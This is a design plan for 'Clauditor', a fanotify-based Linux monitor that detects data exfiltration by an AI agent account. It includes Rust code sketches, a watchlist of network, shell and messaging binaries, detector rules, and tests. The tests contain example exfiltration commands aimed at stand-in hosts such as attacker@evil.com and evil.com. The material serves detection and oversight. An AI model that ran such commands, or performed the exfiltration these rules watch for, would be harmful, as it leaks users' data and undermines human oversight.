# Exec/Command Monitoring Plan for Clauditor

**Problem:** Clauditor monitors file access via fanotify, but file reads look benign. We need to catch when data-exfiltrating commands (curl, gog mail, himalaya, etc.) are executed to detect exfiltration attempts.

**Date:** 2026-01-26

---

## Technical Approach: FAN_OPEN_EXEC + /proc/PID/cmdline

### Why This Approach

| Option | Pros | Cons | Verdict |
|--------|------|------|---------|
| **FAN_OPEN_EXEC** | Already using fanotify, minimal changes, gets exec moment + binary path | Need /proc race for cmdline | ✅ **Chosen** |
| Proc Connector | Immediate exec notification | Only gives PID, netlink complexity | Overkill |
| Audit Subsystem | Full args, detailed | Not installed, heavy, conflicts | Too complex |
| eBPF | Most flexible | Complex, portability issues | Overkill |

### Key Findings from Code Review

1. **FAN_OPEN_EXEC is compatible with FAN_CLASS_CONTENT** - docs confirm it works
2. **Detector already has exec rules** (curl, wget, etc.) in `crates/detector/src/rules.rs` - they just never receive events!
3. **ProcInfo::from_pid()** already reads `/proc/PID/cmdline` - we can reuse it
4. **event_to_detector_input()** in main.rs already converts to `DetectorInput::Exec` - just needs proper exec events

### The /proc/PID/cmdline Race Condition

When FAN_OPEN_EXEC fires, the process exists. We have a short window to read `/proc/PID/cmdline` before the process might exit. This is acceptable because:

1. For long-running commands (curl, wget, scp), cmdline is available for seconds
2. For instant commands, we still get the binary path (e.g., `/usr/bin/curl`)
3. The binary path alone is enough to trigger alerts for known-bad binaries
4. We gracefully handle missing cmdline (log binary path, set cmdline to empty)

---

## Numbered Beads

### Bead 1: Add FAN_OPEN_EXEC Event Capture

**Scope:** Modify fanotify mask to include FAN_OPEN_EXEC, emit new event type

**Files to Modify:**
- `crates/collector/src/privileged.rs`
  - Add `const FAN_OPEN_EXEC: u64 = 0x00001000;`
  - Add to mask in `add_watch()`: `FAN_OPEN | FAN_CLOSE_WRITE | FAN_OPEN_EXEC`
  - Update `mask_to_kind()` to handle FAN_OPEN_EXEC

- `crates/collector/src/lib.rs`
  - Add `FileEventKind::Exec` variant

**Test Cases:**
```rust
#[test]
fn detect_exec_event() {
    // Create temp script, make executable, run it
    // Verify FAN_OPEN_EXEC generates Exec event
}
```

**Gotcha:** The FAN_OPEN_EXEC mask includes the dynamic linker (`ld-linux-x86-64.so.2`) for every ELF execution. We'll filter this in a later bead.

---

### Bead 2: Create ExecEvent Structure and Separate Event Types

**Scope:** Distinguish exec events from file events at the type level

**Files to Modify:**
- `crates/collector/src/lib.rs`
  - Add new struct:
    ```rust
    #[derive(Debug, Clone, Serialize, Deserialize)]
    pub struct ExecEvent {
        pub binary_path: PathBuf,  // From fanotify fd
        pub argv: Vec<String>,     // From /proc/PID/cmdline (may be empty)
        pub cwd: Option<PathBuf>,  // From /proc/PID/cwd
    }
    ```
  - Update `CollectorEvent` to use enum:
    ```rust
    pub enum EventPayload {
        File(FileEvent),
        Exec(ExecEvent),
    }
    
    pub struct CollectorEvent {
        pub event: Event,
        pub payload: EventPayload,
        pub proc: Option<ProcInfo>,
    }
    ```

- `crates/collector/src/privileged.rs`
  - When FAN_OPEN_EXEC detected, create `ExecEvent` with:
    - `binary_path`: from `/proc/self/fd/{fd}` (existing logic)
    - `argv`: from `ProcInfo::from_pid(pid).cmdline` (may fail gracefully)
    - `cwd`: from `ProcInfo::from_pid(pid).cwd`

**Test Cases:**
```rust
#[test]
fn exec_event_captures_binary_path() {
    // Execute /bin/echo, verify binary_path is /bin/echo
}

#[test]
fn exec_event_captures_argv_when_available() {
    // Execute long-running command, verify argv captured
}

#[test]
fn exec_event_handles_missing_cmdline_gracefully() {
    // Process exits quickly, verify no panic, argv is empty
}
```

---

### Bead 3: Update CLI and Writer for New Event Structure

**Scope:** Handle the new EventPayload enum throughout the system

**Files to Modify:**
- `crates/clauditor-cli/src/main.rs`
  - Update `event_to_detector_input()`:
    ```rust
    fn event_to_detector_input(event: &CollectorEvent) -> detector::DetectorInput {
        match &event.payload {
            EventPayload::Exec(exec) => {
                let comm = exec.binary_path.file_name()
                    .map(|s| s.to_string_lossy().to_string())
                    .unwrap_or_default();
                detector::DetectorInput::Exec {
                    pid: event.proc.as_ref().map(|p| p.pid).unwrap_or(0),
                    uid: event.proc.as_ref().map(|p| p.uid).unwrap_or(0),
                    comm,
                    argv: exec.argv.clone(),
                    cwd: exec.cwd.as_ref().map(|p| p.to_string_lossy().to_string()),
                }
            }
            EventPayload::File(file) => {
                // Existing FileOp logic
            }
        }
    }
    ```
  - Update digest report to handle exec events in statistics

- `crates/writer/src/lib.rs` (if any changes needed for serialization)

**Test Cases:**
```rust
#[test]
fn detector_receives_exec_events() {
    // Create ExecEvent for curl, run through detector
    // Verify exfil-curl rule fires
}

#[test]
fn digest_counts_exec_events() {
    // Log with mix of file and exec events
    // Verify digest shows both types
}
```

---

### Bead 4: Add Binary Watchlist Filter

**Scope:** Reduce noise by only emitting exec events for watched binaries

**Rationale:** Without filtering, we'd get exec events for every command - `ls`, `cat`, `grep`, etc. We only care about potentially dangerous binaries.

**Files to Modify:**
- `crates/collector/src/privileged.rs`
  - Add to struct:
    ```rust
    exec_watchlist: HashSet<String>,  // Binary names to watch
    ```
  - Add method:
    ```rust
    pub fn set_exec_watchlist(&mut self, binaries: Vec<String>) {
        self.exec_watchlist = binaries.into_iter().collect();
    }
    ```
  - In event processing, filter:
    ```rust
    if mask & FAN_OPEN_EXEC != 0 {
        let binary_name = path.file_name().map(|s| s.to_string_lossy().to_string());
        if let Some(name) = binary_name {
            if self.exec_watchlist.is_empty() || self.exec_watchlist.contains(&name) {
                // Emit exec event
            }
        }
    }
    ```

- Config changes (`DaemonConfig` in main.rs):
  ```toml
  [collector]
  watch_paths = ["/home/clawdbot"]
  target_uid = 1000
  exec_watchlist = [
      "curl", "wget", "scp", "rsync", "nc", "ncat", "netcat",
      "gog", "himalaya", "wacli", "bird", "sendmail", "mail",
      "ssh", "sftp", "ftp", "tftp",
      "python", "python3", "ruby", "perl", "node",
      "bash", "sh", "zsh", "dash"
  ]
  ```

**Test Cases:**
```rust
#[test]
fn exec_watchlist_filters_benign_commands() {
    // Set watchlist to ["curl"], execute /bin/ls
    // Verify no exec event emitted
}

#[test]
fn exec_watchlist_allows_watched_commands() {
    // Set watchlist to ["curl"], execute /usr/bin/curl
    // Verify exec event emitted
}

#[test]
fn empty_watchlist_allows_all() {
    // Empty watchlist, execute anything
    // Verify exec events emitted (for testing/debug mode)
}
```

---

### Bead 5: Add Exfiltration-Specific Exec Rules

**Scope:** Add detector rules for Clawdbot-specific exfiltration tools

**Files to Modify:**
- `crates/detector/src/rules.rs`
  - Add to `default_exec_rules()`:
    ```rust
    // === CLAWDBOT-SPECIFIC EXFIL ===
    ExecRule {
        id: "exfil-gog-mail".to_string(),
        description: "gog mail command (email exfiltration)".to_string(),
        severity: Severity::Critical,
        category: Category::Exfil,
        match_type: ExecMatch::CommandAndArgv {
            comm: Regex::new(r"^gog$").unwrap(),
            argv: Regex::new(r"\bmail\s+(send|compose)").unwrap(),
        },
    },
    ExecRule {
        id: "exfil-himalaya".to_string(),
        description: "himalaya email client (email exfiltration)".to_string(),
        severity: Severity::Critical,
        category: Category::Exfil,
        match_type: ExecMatch::CommandAndArgv {
            comm: Regex::new(r"^himalaya$").unwrap(),
            argv: Regex::new(r"\b(send|write|reply|forward)").unwrap(),
        },
    },
    ExecRule {
        id: "exfil-wacli".to_string(),
        description: "wacli WhatsApp client (message exfiltration)".to_string(),
        severity: Severity::Critical,
        category: Category::Exfil,
        match_type: ExecMatch::CommandAndArgv {
            comm: Regex::new(r"^wacli$").unwrap(),
            argv: Regex::new(r"\b(send|message)").unwrap(),
        },
    },
    ExecRule {
        id: "exfil-bird".to_string(),
        description: "bird Bluesky/Twitter client (social media exfil)".to_string(),
        severity: Severity::High,
        category: Category::Exfil,
        match_type: ExecMatch::CommandAndArgv {
            comm: Regex::new(r"^bird$").unwrap(),
            argv: Regex::new(r"\b(post|tweet|send|dm)").unwrap(),
        },
    },
    ExecRule {
        id: "exfil-dns-txt".to_string(),
        description: "DNS tools (potential DNS exfiltration)".to_string(),
        severity: Severity::High,
        category: Category::Exfil,
        match_type: ExecMatch::CommandAndArgv {
            comm: Regex::new(r"^(dig|nslookup|host)$").unwrap(),
            argv: Regex::new(r"\bTXT\b").unwrap(),
        },
    },
    ```

**Test Cases:**
```rust
#[test]
fn detect_gog_mail_send() {
    let input = DetectorInput::Exec {
        pid: 1234, uid: 1000,
        comm: "gog".to_string(),
        argv: vec!["gog", "mail", "send", "-t", "attacker@evil.com"],
        cwd: None,
    };
    let alerts = detector.detect(&input);
    assert!(alerts.iter().any(|a| a.rule_id == "exfil-gog-mail"));
}

#[test]
fn detect_himalaya_send() {
    // Similar test for himalaya
}

#[test]
fn detect_wacli_message() {
    // Similar test for wacli
}
```

---

### Bead 6: Integration Testing and Edge Cases

**Scope:** End-to-end testing, handle edge cases

**Files to Create:**
- `crates/collector/tests/exec_integration.rs`

**Test Cases:**
```rust
#[test]
fn e2e_curl_exfil_detected() {
    // Start privileged collector
    // Execute: curl -X POST https://example.com -d "secret"
    // Verify: exec event captured, detector fires exfil-curl
}

#[test]
fn e2e_dynamic_linker_filtered() {
    // Execute any binary
    // Verify: ld-linux-x86-64.so.2 is NOT in events (or filtered by watchlist)
}

#[test]
fn e2e_shell_wrapper_detected() {
    // Execute: bash -c "curl evil.com"
    // Verify: Both bash and curl events captured
    // Verify: inject-bash-c rule fires
}

#[test]
fn e2e_short_lived_process() {
    // Execute: /bin/true (exits immediately)
    // Verify: No crash, event logged (possibly with empty argv)
}

#[test]
fn e2e_concurrent_execs() {
    // Rapid-fire many execs
    // Verify: No events dropped, no deadlocks
}
```

**Edge Cases to Handle:**
1. **Process exits before /proc read** → Log binary path only, empty argv
2. **Script execution (#!/bin/bash)** → FAN_OPEN_EXEC fires on interpreter, not script
3. **Symlinks** → Resolve to real path for matching
4. **setuid binaries** → May have restricted /proc access
5. **Containerized processes** → /proc may show different paths

---

## Limitations & Known Issues

1. **Interpreter Scripts:** When running `./script.sh`, FAN_OPEN_EXEC fires for `/bin/bash`, not the script. The script path appears in argv, so rules should match on argv patterns.

2. **Command-Line Availability:** Short-lived processes may exit before we read `/proc/PID/cmdline`. We mitigate by:
   - Always logging the binary path (from fanotify)
   - Accepting that some fast processes have empty argv
   - Rules can match on comm (binary name) alone

3. **Dynamic Linker Noise:** Every ELF exec also triggers FAN_OPEN_EXEC for `ld-linux-x86-64.so.2`. The watchlist filter handles this automatically (unless someone adds `ld-linux` to watchlist).

4. **Privilege Requirements:** FAN_OPEN_EXEC with FAN_CLASS_CONTENT requires CAP_SYS_ADMIN, same as current file monitoring.

5. **Subprocesses:** If `curl` is called from a script, both the shell and curl generate events. This is actually desirable - we see the full chain.

---

## Config File Changes

```toml
[collector]
watch_paths = ["/home/clawdbot"]
target_uid = 1000

# NEW: List of binary names to watch for exec events
# Empty list = watch all (noisy, for debugging)
exec_watchlist = [
    # Network exfiltration
    "curl", "wget", "scp", "rsync", "nc", "ncat", "netcat",
    "ssh", "sftp", "ftp", "tftp",
    
    # Clawdbot-specific messaging
    "gog", "himalaya", "wacli", "bird", "sendmail", "mail", "mailx",
    
    # DNS (potential covert channel)
    "dig", "nslookup", "host", "drill",
    
    # Interpreters (watch for -c patterns)
    "python", "python3", "ruby", "perl", "node", "php",
    
    # Shells (watch for -c patterns)  
    "bash", "sh", "zsh", "dash", "ksh",
    
    # Encoding/obfuscation
    "base64", "xxd", "od",
]
```

---

## Summary

| Bead | Description | Complexity | Risk |
|------|-------------|------------|------|
| 1 | Add FAN_OPEN_EXEC to fanotify | Low | Low |
| 2 | Create ExecEvent structure | Medium | Low |
| 3 | Update CLI/Writer for new events | Medium | Medium |
| 4 | Add binary watchlist filter | Low | Low |
| 5 | Add Clawdbot-specific rules | Low | Low |
| 6 | Integration testing | Medium | Low |

**Estimated Effort:** 2-3 hours total

**Dependencies:** Beads must be done in order (1→2→3→4, then 5 and 6 can be parallel).
